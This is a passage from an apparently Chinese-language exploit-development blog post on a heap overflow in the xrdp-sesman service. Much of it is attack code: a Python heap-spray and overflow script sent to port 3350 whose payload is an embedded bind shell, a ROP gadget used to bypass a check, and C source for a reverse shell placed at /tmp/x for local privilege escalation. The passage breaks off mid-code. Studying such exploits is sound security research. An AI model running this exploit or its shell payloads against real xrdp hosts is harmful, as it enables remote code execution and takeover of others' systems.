self-&gt;in_s-&gt;end, to_read);<br>				......<br>&#125;<br></code></pre></td></tr></table></figure>

<ul>
<li><code>self-&gt;status</code> 必须固定为 <code>TRANS_STATUS_UP</code></li>
<li><code>self-&gt;type1</code> 不可为 <code>TRANS_TYPE_LISTENER</code></li>
<li><code>self-&gt;trans_can_recv</code> 返回非 0 值</li>
<li><code>self-&gt;si</code> 非 0</li>
</ul>
<p>可以注意到，由于 <code>self-&gt;status</code> 的值是固定的，因此 <code>self</code> 为字符串时，只有前几个字符可以控制，不过看起来似乎还是够写至少八个字符的，因此第一个参数似乎可以稳定传参。</p>
<p>但是正如刚刚所说，另外两个参数的控制就显得有些麻烦了。</p>
<p>首先是 <code>self-&gt;in_s-&gt;end</code>，这意味着需要先覆盖 <code>self-&gt;in_s</code> 为 <code>target_addr-end_offset</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stream</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> *p;<br>    <span class="hljs-type">char</span> *end;<br>    <span class="hljs-type">char</span> *data;<br>    <span class="hljs-type">int</span> size;<br>    <span class="hljs-type">int</span> pad0;<br>    <span class="hljs-comment">/* offsets of various headers */</span><br>    <span class="hljs-type">char</span> *iso_hdr;<br>    <span class="hljs-type">char</span> *mcs_hdr;<br>    <span class="hljs-type">char</span> *sec_hdr;<br>    <span class="hljs-type">char</span> *rdp_hdr;<br>    <span class="hljs-type">char</span> *channel_hdr;<br>    <span class="hljs-comment">/* other */</span><br>    <span class="hljs-type">char</span> *next_packet;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stream</span> *<span class="hljs-title">next</span>;</span><br>    <span class="hljs-type">int</span> *source;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>也就是说，需要它是一个地址，而现在我们似乎没办法泄露随机的堆地址。</p>
<p>第二个是 <code>to_read</code> 函数，它通过两行代码计算得出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">read_so_far = (<span class="hljs-type">int</span>) (self-&gt;in_s-&gt;end - self-&gt;in_s-&gt;data);<br>to_read = self-&gt;header_size - read_so_far;<br></code></pre></td></tr></table></figure>

<p>控制 <code>to_read</code> 并不困难，假设我们需要它指向一个堆，由于堆地址总是小于 0x80000000，因此它是一个正数能够被保证，其次，<code>self-&gt;header_size</code> 能够被任意控制，因此控制其值本身是容易的，但是问题还是一样的，堆地址怎么来？</p>
<p>另外还有一个需要注意的点是，为了调用 <code>self-&gt;trans_recv</code> 需要先通过 <code>self-&gt;trans_can_recv</code> ，由于 <code>self</code> 结构体已经被覆盖，该函数是有一定可能调用失败的，该函数的实际实现如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br><span class="hljs-title function_">g_sck_can_recv</span><span class="hljs-params">(<span class="hljs-type">int</span> sck, <span class="hljs-type">int</span> millis)</span><br>&#123;<br>    fd_set rfds;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timeval</span> <span class="hljs-title">time</span>;</span><br>    <span class="hljs-type">int</span> rv;<br><br>    g_memset(&amp;time, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(time));<br>    time.tv_sec = millis / <span class="hljs-number">1000</span>;<br>    time.tv_usec = (millis * <span class="hljs-number">1000</span>) % <span class="hljs-number">1000000</span>;<br>    FD_ZERO(&amp;rfds);<br><br>    <span class="hljs-keyword">if</span> (sck &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        FD_SET(((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)sck), &amp;rfds);<br>        rv = select(sck + <span class="hljs-number">1</span>, &amp;rfds, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;time);<br><br>        <span class="hljs-keyword">if</span> (rv &gt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>由于我们完全不关心该函数的功能逻辑，笔者在构造 exp 时候打算令其直接恒真：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x0000000000405464</span> : or al, <span class="hljs-number">0x89</span> ; ret<br></code></pre></td></tr></table></figure>

<p>注意到程序有这么一个 gadget 可以利用，因此我们将该函数指针覆盖为该 gadget 时即可绕过检查。</p>
<h3 id="堆喷的可能性"><a href="#堆喷的可能性" class="headerlink" title="堆喷的可能性"></a>堆喷的可能性</h3><p>您可能会注意到，每次初始化输入缓冲区和输出缓冲区时，都建立了 0x2000 大小的缓冲区，这个值并不小，那么如果多建立几个连接，是否就能够像堆喷那样完成利用呢？</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Maximum number of short-lived connections to sesman</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * At the moment, all connections to sesman are short-lived. This may change</span><br><span class="hljs-comment"> * in the future</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SHORT_LIVED_CONNECTIONS 16</span><br></code></pre></td></tr></table></figure>

<p>可以看见，此处的 <code>MAX_SHORT_LIVED_CONNECTIONS</code> 较小，它只允许我们最多保持 16 个连接，生成的堆内存如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; vmmap<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>          <span class="hljs-number">0x400000</span>           <span class="hljs-number">0x403000</span> r--p     <span class="hljs-number">3000</span> <span class="hljs-number">0</span>      /usr/local/sbin/xrdp-sesman<br>          <span class="hljs-number">0x403000</span>           <span class="hljs-number">0x40b000</span> r-xp     <span class="hljs-number">8000</span> <span class="hljs-number">3000</span>   /usr/local/sbin/xrdp-sesman<br>          <span class="hljs-number">0x40b000</span>           <span class="hljs-number">0x40f000</span> r--p     <span class="hljs-number">4000</span> b000   /usr/local/sbin/xrdp-sesman<br>          <span class="hljs-number">0x40f000</span>           <span class="hljs-number">0x410000</span> r--p     <span class="hljs-number">1000</span> e000   /usr/local/sbin/xrdp-sesman<br>          <span class="hljs-number">0x410000</span>           <span class="hljs-number">0x411000</span> rw-p     <span class="hljs-number">1000</span> f000   /usr/local/sbin/xrdp-sesman<br>          <span class="hljs-number">0x65b000</span>           <span class="hljs-number">0x6a7000</span> rw-p    <span class="hljs-number">4</span>c000 <span class="hljs-number">0</span>      [heap]<br>          <span class="hljs-number">0x6a7000</span>           <span class="hljs-number">0x6c8000</span> rw-p    <span class="hljs-number">21000</span> <span class="hljs-number">0</span>      [heap]<br><br></code></pre></td></tr></table></figure>

<p>总共的堆内存大小为 0x6D000，考虑到堆一开始就有一部分被用于其他用途，笔者最终算出来的堆内存可用大小最多为 0x5b0b8，而堆的地址大概在 0x0300000~0x3500000</p>
<blockquote>
<p>这个数值是笔者在调试过程中根据印象猜出来的，实际还是要以源代码为准，但笔者在这里想要表达的意思是，强行堆喷的成功率不高，粗算一下大概是 0.7112884521484375%(原神单抽一个五星的感觉)</p>
</blockquote>
<p>但其实还不只是如此，因为强行堆喷需要布置的内容是参数+地址，大致结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">args_str1 | args_str2 | args_str1_addr | args_str2_addr<br></code></pre></td></tr></table></figure>

<p>而您需要保证的是：</p>
<ul>
<li><code>self-&gt;in_s</code> 能够指向 <code>args_str1_addr-8</code></li>
<li>以及 <code>args_str1_addr</code> 能够指向 <code>args_str1</code></li>
</ul>
<p>如果您能够保证以上两点，<code>args_str2_addr</code> 由于可以通过偏移算出，因此几乎必中，<code>to_read</code> 参数也可以通过偏移算出，也能够保证几乎必中。</p>
<p>但您也发现了，这需要碰撞两次地址，对本就不太容易成功的条件更是雪上加霜。看起来似乎需要优化一下堆喷的思路才能够完成。</p>
<h3 id="对堆喷思路的优化"><a href="#对堆喷思路的优化" class="headerlink" title="对堆喷思路的优化"></a>对堆喷思路的优化</h3><blockquote>
<p>注：以下内容是笔者在尝试时的一种猜测，它没能成功，但笔者仍然写在这里，期望与各位师傅们探讨它的可行性。可能已经有过这样的技巧了，但作为一次学习记录，姑且写下吧。</p>
</blockquote>
<p>因为一开始我们是将输入的结构作为一个整体进行地址碰撞，但似乎可以拆分一下来提高成功率。</p>
<p>结构一为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">args_str1 | args_str2<br></code></pre></td></tr></table></figure>

<p>结构二为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">args_str1_addr | args_str2_addr<br></code></pre></td></tr></table></figure>

<p>也就是说，将字符串和指向字符串的地址拆分开，分别用两个结构去填充内存。</p>
<p>看起来似乎没有差别，但是由于 Glibc 管理的堆内存是一个线性结构，这意味着 <code>args_str1</code> 和 <code>args_str1_addr</code> 是可以有一个较为稳定的相对偏移的(这个偏移会浮动，但笔者认为浮动不大，只要字符串结构布置的足够密集，理论上会更容易命中一点)。</p>
<p>那么情况就会变成：如果 <code>self-&gt;in_s</code> 命中了 <code>args_str1_addr-8</code> ，那么， <code>args_str1_addr</code> 为 <code>args_str1+offset</code> ，理论上也有不小的概率能够命中。</p>
<p>这么来看，似乎将本来需要碰撞两次的地址优化为了只 <strong>需要碰撞一次+一个中概率事件发生</strong>。</p>
<blockquote>
<p>在 16 个连接的条件下，由于堆的大小较小，因此笔者没能成功，但是如果我们调大了这块内存，允许建立大约 100 个连接左右的情况下，堆的内存会骤增。笔者最后测试的结果大约是 10% 左右的碰撞命中率。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pack_addr</span>():<br>    sdata=<span class="hljs-string">b&quot;python3\x00-cimport socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\&quot;\&quot;,10000));s.listen();c,_=s.accept();f=c.fileno();os.dup2(f,0);os.dup2(f,1);os.dup2(f,2);os.system(\&quot;sh\&quot;);\x00&quot;</span><br>    <span class="hljs-keyword">return</span> sdata<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pack_addr2</span>():<br>    sdata = <span class="hljs-string">b&quot;\xf0\x93\x0a\x02\x00\x00\x00\x00&quot;</span><br>    sdata = <span class="hljs-string">b&quot;\xf8\x93\x0a\x02\x00\x00\x00\x00&quot;</span><br>    <span class="hljs-keyword">return</span> sdata<br><br>s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>s.connect((<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">3350</span>))<br><br><span class="hljs-comment"># padding args_str</span><br>con_list=[<span class="hljs-number">0</span>]*<span class="hljs-number">300</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>):<br>    con_list[i] = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>    con_list[i].connect((<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">3350</span>))<br>    sdata = <span class="hljs-string">b&#x27;&#x27;</span><br>    sdata += struct.pack(<span class="hljs-string">&quot;I&quot;</span>,<span class="hljs-number">0x2222CCCC</span>) <span class="hljs-comment">#version</span><br>    sdata += struct.pack(<span class="hljs-string">&quot;&gt;I&quot;</span>,<span class="hljs-number">0x80000000</span>) <span class="hljs-comment">#headersize</span><br>    con_list[i].send(sdata)<br>    sdata = pack_addr()*<span class="hljs-number">0xd0</span><br>    con_list[i].send(sdata)<br><br>con_list[<span class="hljs-number">14</span>] = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>con_list[<span class="hljs-number">14</span>].connect((<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">3350</span>))<br>con_list[<span class="hljs-number">15</span>] = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>con_list[<span class="hljs-number">15</span>].connect((<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">3350</span>))<br><br>x = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>x.connect((<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">3350</span>))<br><br><span class="hljs-comment"># padding args_str_addr</span><br>con_list2=[<span class="hljs-number">0</span>]*<span class="hljs-number">300</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">heap_spary</span>(<span class="hljs-params">x,y</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(x,y):<br>        con_list2[i] = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>        con_list2[i].connect((<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">3350</span>))<br>        sdata = <span class="hljs-string">b&#x27;&#x27;</span><br>        sdata += struct.pack(<span class="hljs-string">&quot;I&quot;</span>,<span class="hljs-number">0x2222CCCC</span>) <span class="hljs-comment">#version</span><br>        sdata += struct.pack(<span class="hljs-string">&quot;&gt;I&quot;</span>,<span class="hljs-number">0x80000000</span>) <span class="hljs-comment">#headersize</span><br>        con_list2[i].send(sdata)<br>        sdata = pack_addr2()*<span class="hljs-number">0x3f0</span><br>        con_list2[i].send(sdata)<br>        time.sleep(<span class="hljs-number">0.05</span>)<br><br>heap_spary(<span class="hljs-number">0</span>,<span class="hljs-number">50</span>)<br>heap_spary(<span class="hljs-number">50</span>,<span class="hljs-number">100</span>)<br>heap_spary(<span class="hljs-number">100</span>,<span class="hljs-number">150</span>)<br><br><span class="hljs-comment">#init stream</span><br>sdata = <span class="hljs-string">b&#x27;&#x27;</span><br>sdata += struct.pack(<span class="hljs-string">&quot;I&quot;</span>,<span class="hljs-number">0x2222CCCC</span>)<br>sdata += struct.pack(<span class="hljs-string">&quot;&gt;I&quot;</span>,<span class="hljs-number">0x80000000</span>)<br>con_list[<span class="hljs-number">15</span>].send(sdata)<br>sdata = <span class="hljs-string">b&#x27;D&#x27;</span>*<span class="hljs-number">0x10</span><br>con_list[<span class="hljs-number">15</span>].send(sdata)<br><br><span class="hljs-comment"># heap_overflow</span><br>sdata = <span class="hljs-string">b&#x27;&#x27;</span><br>sdata += struct.pack(<span class="hljs-string">&quot;I&quot;</span>,<span class="hljs-number">0x2222CCCC</span>)<br>sdata += struct.pack(<span class="hljs-string">&quot;&gt;I&quot;</span>,<span class="hljs-number">0x80000000</span>)<br>con_list[<span class="hljs-number">14</span>].send(sdata)<br>sdata = <span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x4140</span>+<span class="hljs-string">b&quot;\xb1\x02\x00\x00\x00\x00\x00\x00&quot;</span>+<span class="hljs-string">b&quot;/tmp/x\x00\x00&quot;</span>+<span class="hljs-string">b&quot;\x01\x00\x00\x00&quot;</span>*<span class="hljs-number">2</span><br>sdata+=<span class="hljs-string">b&quot;\x02\x00\x00\x00\x00\x00\x00\x00&quot;</span>+<span class="hljs-string">b&quot;\xba\xc9\x40\x00\x00\x00\x00\x00&quot;</span>+<span class="hljs-string">b&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span><br>sdata+=<span class="hljs-string">b&quot;\x00\x00\x00\x7f\x00\x00\x00\x00&quot;</span>+<span class="hljs-string">b&quot;\xba\xc9\x40\x00\x00\x00\x00\x00&quot;</span>+<span class="hljs-string">b&quot;\xf0\x93\x3a\x02\x00\x00\x00\x00&quot;</span><br>sdata+=<span class="hljs-string">b&quot;P&quot;</span>*<span class="hljs-number">0x240</span>+<span class="hljs-string">b&quot;\xf0\x3b\x40\x00\x00\x00\x00\x00&quot;</span>+<span class="hljs-string">b&quot;\xf0\x3a\x40\x00\x00\x00\x00\x00&quot;</span><br>sdata+=<span class="hljs-string">b&quot;\x64\x54\x40\x00\x00\x00\x00\x00&quot;</span><br>con_list[<span class="hljs-number">14</span>].send(sdata)<br><br><span class="hljs-comment"># trigger execlp</span><br>sdata = <span class="hljs-string">b&#x27;&#x27;</span><br>sdata += struct.pack(<span class="hljs-string">&quot;I&quot;</span>,<span class="hljs-number">0x2222CCCC</span>) <span class="hljs-comment">#version</span><br>sdata += <span class="hljs-string">b&quot;\x58\x01\xda\x00\x00\x00\x00\x00&quot;</span> <span class="hljs-comment">#headersize</span><br>con_list[<span class="hljs-number">15</span>].send(sdata)<br></code></pre></td></tr></table></figure>

<p>大致的 exp 如上，先将参数打入到堆内存的首部，然后再往之后的堆内存里去堆字符串的地址。最后在覆盖 <code>self-&gt;in_s</code> 时候用一个堆地址去撞。</p>
<h3 id="第二法与例外"><a href="#第二法与例外" class="headerlink" title="第二法与例外"></a>第二法与例外</h3><p>在堆喷失败以后，笔者又试了一下其他的方法，最终认为，如果我们只需要在本机上进行提权，完全不需要这么麻烦去构造一个 <code>execlp</code> 的调用链。</p>
<p>首先，我们可以先写一个用于反弹 shell 的程序，用静态编译的方法将其编译到 ”&#x2F;tmp&#x2F;x“：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netdb.h&gt;</span></span><br><span class="hljs-type">char</span> shell[]=<span class="hljs-string">&quot;/bin/sh&quot;</span>;<br><span class="hljs-type">char</span> message[]=<span class="hljs-string">&quot;hi hacker welcome&quot;</span>;<br><span class="hljs-type">int</span> sock;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> &#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">server</span>;</span><br>	<span class="hljs-keyword">if</span>((sock = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>)) == <span class="hljs-number">-1</span>) &#123;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Couldn&#x27;t make socket!n&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>	&#125;<br><br>	server.sin_family = AF_INET;<br>	server.sin_port = htons(atoi(<span class="hljs-string">&quot;10000&quot;</span>));<br>	server.sin_addr.s_addr = inet_addr(<span class="hljs-string">&quot;0.0.0.0&quot;</span>);<br><br>	<span class="hljs-keyword">if</span>(connect(sock, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;server, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr)) == <span class="hljs-number">-1</span>) &#123;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not connect to remote shell!n&quot;</span>);<br>	<span class="hljs-comment">//exit(-1);</span><br>	<span class="hljs-comment">//	return -1;</span><br>		<span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>	&#125;<br>	send(sock, message, <span class="hljs-keyword">sizeof</span>(message), <span class="hljs-number">0</span>);<br>	dup2(sock, <span class="hljs-number">0</span>);<br>	dup2(sock, <span class="hljs-number">1</span>);<br>	dup2(sock, <span class="hljs-number">2</span>);<br>	execl(shell,<span class="hljs-string">&quot;/bin/sh&quot;</span>,(<span class="hljs-type">char</span> *)<span class="hljs-number">0</span>);<br>	close(sock);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>	&#125;<br>	<span class="hljs-type">void</span> <span class="hljs-title function_">usage</span><span class="hljs-params">(<span class="hljs-type">char</span> *prog[])</span> &#123;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage: %s &lt;reflect ip&gt; &lt;port&gt;\n&quot;</span>, prog);<br>	<span class="hljs-comment">//exit(-1);</span><br>	<span class="hljs-comment">//	return -1;</span><br>		<span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>接下来我们令服务调用如下函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>	<span class="hljs-type">int</span> a=execlp(<span class="hljs-string">&quot;/tmp/x&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,(<span class="hljs-type">void</span>*)<span class="hljs-number">0</span>);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>后两个参数是完全随意的，不管是什么，只要是合法参数都行，或者：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>	<span class="hljs-type">int</span> a=execvp(<span class="hljs-string">&quot;/tmp/x&quot;</span>,<span class="hljs-number">0</span>);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>对于 <code>execlp</code> 的情况，由于服务中使用的实际上是 <code>g_execlp3</code> ，因此我们需要保证第二和第三个参数是可解析的，只要它们是可解析的，那么为任意值都行。</p>
<p>而对于第二个情况，我们只需要令第二个参数为 0 即可，不过在该服务中，其实际实现如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br><span class="hljs-title function_">g_execvp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *p1, <span class="hljs-type">char</span> 